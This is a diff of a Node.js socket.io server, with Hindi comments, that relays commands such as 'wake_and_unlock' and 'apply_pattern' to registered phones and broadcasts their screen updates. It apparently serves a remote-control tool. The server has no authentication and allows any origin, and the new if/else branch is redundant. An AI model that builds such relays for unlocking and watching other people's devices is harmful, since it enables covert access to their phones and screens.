@@ -6,9 +6,8 @@ const { Server } = require('socket.io');
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
-    // कनेक्शन को जीवित रखने के लिए पिंग अंतराल और टाइमआउट सेट करें
-    pingInterval: 10000, // हर 10 सेकंड में सर्वर एक पिंग भेजेगा
-    pingTimeout: 5000,   // अगर 5 सेकंड में पोंग वापस नहीं आता, तो कनेक्शन टूट जाएगा
+    pingInterval: 10000,
+    pingTimeout: 5000,
     transports: ['websocket', 'polling'],
     cors: { origin: "*" }
 });
@@ -31,7 +30,12 @@ io.on('connection', (socket) => {
     socket.on('command_to_device', (data) => {
         const device = devices[data.deviceId];
         if (device && device.socketId) {
-            io.to(device.socketId).emit(data.action, data.payload);
+            // नए कमांड्स को भी फॉरवर्ड करें
+            if (data.action === 'wake_and_unlock' || data.action === 'apply_pattern') {
+                io.to(device.socketId).emit(data.action, data.payload);
+            } else {
+                io.to(device.socketId).emit(data.action, data.payload);
+            }
         }
     });
 
@@ -44,16 +48,11 @@ io.on('connection', (socket) => {
         io.emit('screen_update', data);
     });
 
-    // =====================================================================
-    // मुख्य सुधार: हार्टबीट को सुनना
-    // यह सर्वर को जगाए रखेगा
-    // =====================================================================
+    // हार्टबीट
     socket.on('heartbeat', (data) => {
-        // बस हार्टबीट प्राप्त करें, कुछ करने की आवश्यकता नहीं है
-        // यह ट्रैफिक उत्पन्न करने के लिए पर्याप्त है
         if (data && data.deviceId && devices[data.deviceId]) {
-            // आप चाहें तो बैटरी जैसी जानकारी अपडेट कर सकते हैं
             devices[data.deviceId].battery = data.battery;
+            devices[data.deviceId].lastSeen = new Date().toISOString();
         }
     });
 
